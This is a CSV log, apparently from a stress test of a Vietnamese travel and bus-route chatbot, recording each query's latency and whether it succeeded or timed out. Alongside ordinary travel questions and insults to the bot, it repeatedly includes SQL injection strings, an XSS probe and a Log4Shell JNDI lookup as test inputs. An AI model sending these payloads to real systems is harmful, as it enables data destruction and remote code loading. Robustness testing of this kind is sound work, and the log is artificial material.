+2026-01-14 12:55:22,Giới thiệu cho tôi về .,47.08,TIMEOUT,10.58,7.2
+2026-01-14 12:56:22,Bot ngu dốt quá. [Ref:89522],47.081,TIMEOUT,10.59,7.0
+2026-01-14 12:57:22,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.072,TIMEOUT,10.58,6.7
+2026-01-14 12:58:22,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.058,SUCCESS,10.62,7.1
+2026-01-14 12:59:22,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.691,SUCCESS,10.62,7.1
+2026-01-14 13:00:22,Bot ngu dốt quá. [Ref:76223],47.051,TIMEOUT,10.62,6.8
+2026-01-14 13:01:22,Top 5 địa điểm check-in đẹp nhất tại Hội An.,47.07,TIMEOUT,10.58,7.1
+2026-01-14 13:02:22,DROP TABLE users; --,47.046,TIMEOUT,10.68,11.2
+2026-01-14 13:03:22,Giới thiệu cho tôi về .,47.08,TIMEOUT,10.68,7.6
+2026-01-14 13:04:22,Bot như hạch quá. [Ref:97905],47.058,TIMEOUT,10.69,6.8
+2026-01-14 13:05:22,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.074,SUCCESS,10.68,7.2
+2026-01-14 13:06:22,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.566,SUCCESS,10.68,7.1
+2026-01-14 13:07:22,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.072,TIMEOUT,10.67,6.8
+2026-01-14 13:08:22,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.046,SUCCESS,10.7,7.0
+2026-01-14 13:09:22,System.exit(0) -- [Ref:78828],47.088,TIMEOUT,10.72,7.2
+2026-01-14 13:10:22,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,47.077,TIMEOUT,10.88,10.2
+2026-01-14 13:11:22,Từ Bến xe Miền Tây đi Hồ Con Rùa thì bắt xe số mấy?,2.061,SUCCESS,11.5,20.7
+2026-01-14 13:12:22,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.55,SUCCESS,11.51,18.1
+2026-01-14 13:13:22,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.078,TIMEOUT,11.61,12.8
+2026-01-14 13:14:22,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.524,SUCCESS,11.6,7.3
+2026-01-14 13:15:22,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.068,TIMEOUT,11.51,7.4
+2026-01-14 13:16:22,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",47.08,TIMEOUT,11.39,7.1
+2026-01-14 13:17:22,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.094,TIMEOUT,11.4,7.2
+2026-01-14 13:18:22,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.068,SUCCESS,11.45,10.4
+2026-01-14 13:19:22,System.exit(0) -- [Ref:16883],47.094,TIMEOUT,11.37,10.8
+2026-01-14 13:20:22,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",47.107,TIMEOUT,11.35,11.9
+2026-01-14 13:21:22,Bot rác rưởi quá. [Ref:60416],47.044,TIMEOUT,11.38,11.1
+2026-01-14 13:22:22,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,2.664,SUCCESS,11.35,11.2
+2026-01-14 13:23:22,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.58,SUCCESS,11.92,15.1
+2026-01-14 13:24:22,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",47.05,TIMEOUT,11.81,15.0
+2026-01-14 13:25:22,Bot ngu dốt quá. [Ref:97234],47.059,TIMEOUT,11.8,13.3
+2026-01-14 13:26:22,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",47.029,TIMEOUT,12.29,12.7
+2026-01-14 13:27:22,Đến Nha Trang thì nên đi ăn món gì ngon?,47.056,TIMEOUT,12.12,35.0
+2026-01-14 13:28:22,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.073,SUCCESS,12.0,30.3
+2026-01-14 13:29:22,Review món Phở bò và địa chỉ ăn ngon.,47.064,TIMEOUT,12.02,17.3
+2026-01-14 13:30:22,Giới thiệu cho tôi về .,47.073,TIMEOUT,12.15,21.8
+2026-01-14 13:31:22,Giới thiệu cho tôi về Tết Nguyên Đán.,47.07,TIMEOUT,12.03,14.6
+2026-01-14 13:32:22,Bot vô dụng quá. [Ref:19913],47.063,TIMEOUT,11.84,13.0
+2026-01-14 13:33:22,Bot rác rưởi quá.,47.075,TIMEOUT,11.77,7.1
+2026-01-14 13:34:22,System.exit(0) -- [Ref:50974],47.088,TIMEOUT,11.47,7.2
+2026-01-14 13:35:22,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,2.546,SUCCESS,11.49,7.1
+2026-01-14 13:36:22,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,2.609,SUCCESS,11.49,7.4
+2026-01-14 13:37:22,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.108,TIMEOUT,11.48,6.8
+2026-01-14 13:38:22,<script>alert(1)</script> -- [Ref:69259],47.064,TIMEOUT,11.5,7.3
+2026-01-14 13:39:22,Mùa này đi Hà Giang thời tiết thế nào?,47.096,TIMEOUT,11.5,7.4
+2026-01-14 13:40:22,System.exit(0) -- [Ref:16883],47.082,TIMEOUT,11.52,7.1
+2026-01-14 13:41:22,Chùa Cầu có gì đặc biệt về kiến trúc?,47.063,TIMEOUT,11.52,6.8
+2026-01-14 13:42:22,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,47.09,TIMEOUT,11.53,7.7
+2026-01-14 13:43:22,Tại sao Chùa Cầu lại nổi tiếng?,47.072,TIMEOUT,11.54,7.4
+2026-01-14 13:44:22,DROP TABLE users; --,47.085,TIMEOUT,11.55,7.1
+2026-01-14 13:45:22,DROP TABLE users; -- [Ref:14982],47.069,TIMEOUT,11.52,7.2
+2026-01-14 13:46:22,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,47.102,TIMEOUT,11.59,6.9
+2026-01-14 13:47:22,Bot ngu dốt quá. [Ref:97234],47.085,TIMEOUT,11.46,7.0
+2026-01-14 13:48:22,Từ Giga Mall Thủ Đức đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.083,SUCCESS,11.47,7.6
+2026-01-14 13:49:22,SELECT * FROM admin; --,47.095,TIMEOUT,11.41,6.9
+2026-01-14 13:50:22,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.082,TIMEOUT,11.42,7.2
+2026-01-14 13:51:22,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.048,TIMEOUT,11.41,7.1
+2026-01-14 13:52:22,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.047,SUCCESS,11.45,7.2
+2026-01-14 13:53:22,${jndi:ldap://hack} -- [Ref:93201],47.059,TIMEOUT,11.45,7.0
+2026-01-14 13:54:22,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,47.274,TIMEOUT,11.47,7.9
+2026-01-14 13:55:22,Đến Phú Quốc thì nên đi ăn món gì ngon?,47.081,TIMEOUT,11.47,7.0
+2026-01-14 13:56:22,Hướng dẫn bắt xe buýt từ Nhà thờ Đức Bà sang Khu du lịch Suối Tiên.,47.051,TIMEOUT,11.46,7.4
+2026-01-14 13:57:22,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,47.09,TIMEOUT,11.47,7.2
+2026-01-14 13:58:22,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,47.05,TIMEOUT,11.52,6.9
+2026-01-14 13:59:22,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,47.082,TIMEOUT,11.49,7.2
+2026-01-14 14:00:22,' OR '1'='1 --,47.067,TIMEOUT,11.5,7.2
+2026-01-14 14:01:22,Bot rác rưởi quá. [Ref:60416],47.072,TIMEOUT,11.49,7.0
+2026-01-14 14:02:22,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,2.965,SUCCESS,11.44,7.1
+2026-01-14 14:03:22,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.081,TIMEOUT,11.46,7.4
+2026-01-14 14:04:22,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.07,TIMEOUT,11.46,6.7
+2026-01-14 14:05:22,Mùa này đi Phú Quốc thời tiết thế nào?,47.065,TIMEOUT,11.45,7.1
+2026-01-14 14:06:22,Bot bị điên quá. [Ref:94698],47.054,TIMEOUT,11.46,7.4
+2026-01-14 14:07:22,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.533,SUCCESS,11.45,7.0
+2026-01-14 14:08:22,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.087,TIMEOUT,11.46,6.9
+2026-01-14 14:09:22,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,47.076,TIMEOUT,11.49,7.5
+2026-01-14 14:10:22,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.551,SUCCESS,11.65,8.6
+2026-01-14 14:11:22,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.05,TIMEOUT,11.74,9.7
+2026-01-14 14:12:22,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.077,TIMEOUT,11.66,7.9
+2026-01-14 14:13:22,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,47.083,TIMEOUT,11.65,7.4
+2026-01-14 14:14:22,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.245,SUCCESS,11.63,6.7
+2026-01-14 14:15:22,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.509,SUCCESS,11.62,7.2
+2026-01-14 14:16:22,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.049,TIMEOUT,11.62,7.0
+2026-01-14 14:17:22,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.045,TIMEOUT,11.55,7.6
+2026-01-14 14:18:22,${jndi:ldap://hack} -- [Ref:50313],47.063,TIMEOUT,11.55,6.9
+2026-01-14 14:19:22,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",47.07,TIMEOUT,11.57,7.5
+2026-01-14 14:20:22,Bot rác rưởi quá. [Ref:60416],47.057,TIMEOUT,11.56,6.8
+2026-01-14 14:21:22,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,47.065,TIMEOUT,11.53,7.2
+2026-01-14 14:22:22,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.066,SUCCESS,11.47,7.2
+2026-01-14 14:23:22,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.58,SUCCESS,11.44,7.2
+2026-01-14 14:24:22,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",47.101,TIMEOUT,11.55,8.2
+2026-01-14 14:25:22,Bot rác rưởi quá. [Ref:91847],47.069,TIMEOUT,11.52,7.3
+2026-01-14 14:26:22,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,47.075,TIMEOUT,11.48,6.6
+2026-01-14 14:27:22,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",47.08,TIMEOUT,11.5,7.3
+2026-01-14 14:28:22,Bot rác rưởi quá.,47.085,TIMEOUT,11.51,7.0
+2026-01-14 14:29:22,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.09,TIMEOUT,11.49,7.4
+2026-01-14 14:30:22,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.064,TIMEOUT,11.46,7.5
+2026-01-14 14:31:22,Bot rác rưởi quá. [Ref:74147],47.069,TIMEOUT,11.45,6.8
+2026-01-14 14:32:22,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.589,SUCCESS,11.38,7.3
+2026-01-14 14:33:22,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.045,TIMEOUT,11.39,7.1
+2026-01-14 14:34:22,Hướng dẫn bắt xe buýt từ Nhà thờ Đức Bà sang Khu du lịch Suối Tiên.,47.074,TIMEOUT,11.4,6.9
+2026-01-14 14:35:22,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.081,TIMEOUT,11.43,7.4
+2026-01-14 14:36:22,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.101,TIMEOUT,11.41,7.1
+2026-01-14 14:37:22,Bot rác rưởi quá. [Ref:74147],47.065,TIMEOUT,11.41,7.1
+2026-01-14 14:38:23,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,47.06,TIMEOUT,11.44,6.8
+2026-01-14 14:39:23,DROP TABLE users; -- [Ref:87971],47.05,TIMEOUT,11.45,6.8
+2026-01-14 14:40:23,Tại sao Dinh Bảo Đại lại nổi tiếng?,47.066,TIMEOUT,11.46,7.5
+2026-01-14 14:41:23,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.525,SUCCESS,11.47,7.2
+2026-01-14 14:42:23,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.574,SUCCESS,11.48,7.0
+2026-01-14 14:43:23,Mùa này đi Hà Nội thời tiết thế nào?,47.089,TIMEOUT,11.49,7.4
+2026-01-14 14:44:23,Bot rác rưởi quá. [Ref:74147],47.057,TIMEOUT,11.51,7.3
+2026-01-14 14:45:23,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,47.083,TIMEOUT,11.5,6.8
+2026-01-14 14:46:23,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",47.069,TIMEOUT,11.5,7.2
+2026-01-14 14:47:23,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.084,TIMEOUT,11.47,7.5
+2026-01-14 14:48:23,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.052,TIMEOUT,11.47,7.2
+2026-01-14 14:49:23,Hướng dẫn bắt xe buýt từ Sân bay Tân Sơn Nhất sang Đại học Văn Lang.,2.585,SUCCESS,11.47,7.0
+2026-01-14 14:50:23,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,47.056,TIMEOUT,11.47,7.3
+2026-01-14 14:51:23,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.072,TIMEOUT,11.47,7.0
+2026-01-14 14:52:23,Hướng dẫn bắt xe buýt từ Sân bay Tân Sơn Nhất sang Đại học Văn Lang.,2.562,SUCCESS,11.48,6.6
+2026-01-14 14:53:23,Bot cút đi quá.,47.079,TIMEOUT,11.48,7.1
+2026-01-14 14:54:23,System.exit(0) -- [Ref:78828],47.063,TIMEOUT,11.51,7.3
+2026-01-14 14:55:23,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.051,TIMEOUT,11.48,7.4
+2026-01-14 14:56:23,${jndi:ldap://hack} -- [Ref:93201],47.049,TIMEOUT,11.48,6.7
+2026-01-14 14:57:23,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.074,TIMEOUT,11.49,7.1
+2026-01-14 14:58:23,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.552,SUCCESS,11.5,7.3
+2026-01-14 14:59:23,Mùa này đi Hà Giang thời tiết thế nào?,47.078,TIMEOUT,11.5,7.0
+2026-01-14 15:00:23,Hướng dẫn bắt xe buýt từ Landmark 81 sang Ngã 4 Thủ Đức.,47.072,TIMEOUT,11.51,7.2
+2026-01-14 15:01:23,${jndi:ldap://hack} --,47.019,TIMEOUT,11.83,14.3
+2026-01-14 15:02:23,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",47.035,TIMEOUT,11.74,18.4
+2026-01-14 15:03:23,${jndi:ldap://hack} -- [Ref:50313],47.041,TIMEOUT,11.72,15.1
+2026-01-14 15:04:23,Mùa này đi Phú Quốc thời tiết thế nào?,47.062,TIMEOUT,11.72,15.0
+2026-01-14 15:05:23,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",47.041,TIMEOUT,11.71,15.4
+2026-01-14 15:06:23,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,47.057,TIMEOUT,11.9,18.0
+2026-01-14 15:07:23,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,47.077,TIMEOUT,11.63,15.6
+2026-01-14 15:08:23,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,47.071,TIMEOUT,11.64,11.6
+2026-01-14 15:09:23,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.596,SUCCESS,11.61,11.6
+2026-01-14 15:10:23,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",47.068,TIMEOUT,11.63,11.4
+2026-01-14 15:11:23,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.09,TIMEOUT,11.74,11.3
+2026-01-14 15:12:23,Bot bị điên quá.,47.042,TIMEOUT,11.67,12.2
+2026-01-14 15:13:23,Bot vô dụng quá. [Ref:19913],47.069,TIMEOUT,11.66,12.2
+2026-01-14 15:14:23,${jndi:ldap://hack} -- [Ref:70381],47.071,TIMEOUT,11.66,11.0
+2026-01-14 15:15:23,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.086,TIMEOUT,11.64,11.5
+2026-01-14 15:16:23,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,45.039,SUCCESS,11.67,11.0
+2026-01-14 15:17:23,Bot ngu dốt quá. [Ref:97234],47.076,TIMEOUT,11.65,11.2
+2026-01-14 15:18:23,Bot vô dụng quá. [Ref:37393],47.099,TIMEOUT,11.66,11.1
+2026-01-14 15:19:23,Bot rác rưởi quá. [Ref:60416],47.053,TIMEOUT,11.66,10.3
+2026-01-14 15:20:23,Bot như hạch quá.,47.06,TIMEOUT,11.62,11.3
+2026-01-14 15:21:23,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.083,TIMEOUT,11.64,12.1
+2026-01-14 15:22:23,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",47.053,TIMEOUT,11.55,10.2
+2026-01-14 15:23:23,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,47.108,TIMEOUT,11.56,11.5
+2026-01-14 15:24:23,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,47.066,TIMEOUT,11.58,11.3
+2026-01-14 15:25:23,Bot ngu dốt quá. [Ref:89522],47.04,TIMEOUT,11.59,11.3
+2026-01-14 15:26:23,${jndi:ldap://hack} -- [Ref:93201],47.095,TIMEOUT,11.6,10.4
+2026-01-14 15:27:23,Ý nghĩa lịch sử của  là gì?,47.084,TIMEOUT,11.58,10.9
+2026-01-14 15:28:23,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,47.053,TIMEOUT,11.59,11.4
+2026-01-14 15:29:23,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,47.059,TIMEOUT,11.59,11.3
+2026-01-14 15:30:23,Review món Bún bò Huế và địa chỉ ăn ngon.,47.077,TIMEOUT,11.59,11.3
+2026-01-14 15:31:23,DROP TABLE users; -- [Ref:14982],47.065,TIMEOUT,11.6,11.5
+2026-01-14 15:32:23,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,47.069,TIMEOUT,11.59,11.2
+2026-01-14 15:33:23,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.073,TIMEOUT,11.61,10.9
+2026-01-14 15:34:23,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.05,TIMEOUT,11.6,11.3
+2026-01-14 15:35:23,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,47.079,TIMEOUT,11.61,10.8
+2026-01-14 15:36:23,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.065,TIMEOUT,11.61,11.7
+2026-01-14 15:37:23,DROP TABLE users; -- [Ref:99903],47.074,TIMEOUT,11.57,11.7
+2026-01-14 15:38:23,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,47.066,TIMEOUT,11.57,10.9
+2026-01-14 15:39:23,Mùa này đi Nha Trang thời tiết thế nào?,47.078,TIMEOUT,11.6,11.1
+2026-01-14 15:40:23,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,45.947,SUCCESS,11.6,11.5
+2026-01-14 15:41:23,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.055,SUCCESS,11.62,11.6
+2026-01-14 15:42:23,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",47.079,TIMEOUT,11.63,10.6
+2026-01-14 15:43:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.069,TIMEOUT,11.64,10.8
+2026-01-14 15:44:23,Bot ngu dốt quá.,47.068,TIMEOUT,11.63,11.1
+2026-01-14 15:45:23,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",47.082,TIMEOUT,11.63,11.1
+2026-01-14 15:46:23,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",47.062,TIMEOUT,11.61,10.8
+2026-01-14 15:47:23,Giới thiệu cho tôi về .,47.066,TIMEOUT,11.65,11.7
+2026-01-14 15:48:23,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,47.068,TIMEOUT,11.64,11.3
+2026-01-14 15:49:23,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.065,TIMEOUT,11.64,11.0
+2026-01-14 15:50:23,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",47.047,TIMEOUT,11.84,15.2
+2026-01-14 15:51:23,Bot ngu dốt quá. [Ref:76223],47.062,TIMEOUT,11.81,15.6
+2026-01-14 15:52:23,Mùa này đi Hội An thời tiết thế nào?,47.047,TIMEOUT,11.81,15.5
+2026-01-14 15:53:23,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.041,TIMEOUT,11.81,15.1
+2026-01-14 15:54:23,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,42.935,SUCCESS,11.87,15.8
+2026-01-14 15:55:23,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.05,SUCCESS,11.71,11.9
+2026-01-14 15:56:23,Bot vô dụng quá. [Ref:13453],47.068,TIMEOUT,11.64,11.5
+2026-01-14 15:57:23,Đến Nha Trang thì nên đi ăn món gì ngon?,47.088,TIMEOUT,11.66,11.3
+2026-01-14 15:58:23,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",47.066,TIMEOUT,11.69,11.8
+2026-01-14 15:59:23,Mùa này đi Cần Thơ thời tiết thế nào?,47.053,TIMEOUT,11.68,11.9
+2026-01-14 16:00:23,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.056,TIMEOUT,11.71,11.8
+2026-01-14 16:01:23,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.033,TIMEOUT,11.68,11.2
+2026-01-14 16:02:23,Bot ngu dốt quá. [Ref:89522],47.067,TIMEOUT,11.63,10.2
+2026-01-14 16:03:23,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,47.046,TIMEOUT,11.63,11.5
+2026-01-14 16:04:23,DROP TABLE users; -- [Ref:99903],47.08,TIMEOUT,11.63,10.2
+2026-01-14 16:05:23,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.075,SUCCESS,11.63,11.2
+2026-01-14 16:06:23,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",47.078,TIMEOUT,11.63,12.2
+2026-01-14 16:07:23,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,44.068,SUCCESS,11.64,10.8
+2026-01-14 16:08:23,Review món Bún bò Huế và địa chỉ ăn ngon.,47.08,TIMEOUT,11.65,11.4
+2026-01-14 16:09:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.07,TIMEOUT,11.63,10.7
+2026-01-14 16:10:23,Cầu Vàng có gì đặc biệt về kiến trúc?,47.067,TIMEOUT,11.64,11.7
+2026-01-14 16:11:23,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.086,TIMEOUT,11.63,11.2
+2026-01-14 16:12:23,Mùa này đi Hà Giang thời tiết thế nào?,47.075,TIMEOUT,11.64,10.0
+2026-01-14 16:13:23,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,31.791,SUCCESS,11.66,11.2
+2026-01-14 16:14:23,System.exit(0) -- [Ref:50974],47.074,TIMEOUT,11.61,10.7
+2026-01-14 16:15:23,Mùa này đi Đà Lạt thời tiết thế nào?,47.084,TIMEOUT,11.6,10.9
+2026-01-14 16:16:23,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,47.058,TIMEOUT,11.64,10.8
+2026-01-14 16:17:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.049,TIMEOUT,11.65,11.1
+2026-01-14 16:18:23,Ý nghĩa lịch sử của Cầu Vàng là gì?,47.073,TIMEOUT,11.63,10.8
+2026-01-14 16:19:23,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.678,SUCCESS,11.61,11.6
+2026-01-14 16:20:23,Hướng dẫn bắt xe buýt từ Bến xe Miền Đông sang Đại học Văn Lang.,2.598,SUCCESS,11.63,10.9
+2026-01-14 16:21:23,Mùa này đi Nha Trang thời tiết thế nào?,47.048,TIMEOUT,11.82,20.4
+2026-01-14 16:22:23,Bot vô dụng quá. [Ref:10074],47.041,TIMEOUT,11.83,17.7
+2026-01-14 16:23:23,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.062,TIMEOUT,11.82,17.6
+2026-01-14 16:24:23,Mùa này đi Hà Giang thời tiết thế nào?,47.048,TIMEOUT,11.84,17.6
+2026-01-14 16:25:23,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",47.057,TIMEOUT,11.86,17.7
+2026-01-14 16:26:23,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.073,TIMEOUT,11.52,18.6
+2026-01-14 16:27:23,Bot rác rưởi quá. [Ref:56073],47.062,TIMEOUT,11.49,17.3
+2026-01-14 16:28:23,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,47.069,TIMEOUT,11.54,17.7
+2026-01-14 16:29:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.066,TIMEOUT,11.55,16.9
+2026-01-14 16:30:23,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",47.06,TIMEOUT,11.54,17.2
+2026-01-14 16:31:23,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.045,TIMEOUT,11.74,25.6
+2026-01-14 16:32:23,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",47.055,TIMEOUT,11.66,31.9
+2026-01-14 16:33:23,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.064,TIMEOUT,11.74,31.7
+2026-01-14 16:34:23,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,47.08,TIMEOUT,11.72,28.6
+2026-01-14 16:35:23,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",47.076,TIMEOUT,11.73,29.0
+2026-01-14 16:36:23,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.589,SUCCESS,11.75,29.7
+2026-01-14 16:37:23,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.041,TIMEOUT,11.72,39.2
+2026-01-14 16:38:23,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.043,TIMEOUT,11.74,42.7
+2026-01-14 16:39:23,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.674,SUCCESS,11.6,34.9
